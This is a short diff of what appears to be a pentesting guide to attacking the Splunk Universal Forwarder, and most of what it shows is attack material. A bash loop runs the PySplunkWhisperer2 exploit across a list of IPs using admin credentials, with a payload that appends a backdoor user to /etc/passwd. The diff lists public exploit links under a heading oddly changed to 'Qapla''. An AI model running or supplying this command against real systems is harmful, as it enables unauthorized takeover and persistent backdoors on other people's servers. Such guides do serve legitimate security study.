@@ -48,11 +48,10 @@ An exploit targeting the Splunk Universal Forwarder Agent (UF) allows attackers 
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
-
-**Usable public exploits:**
-* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
-* https://www.exploit-db.com/exploits/46238
-* https://www.exploit-db.com/exploits/46487
+**Qapla' public exploits:**
+* [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
+* [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
+* [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)
 
 
 ## Abusing Splunk Queries
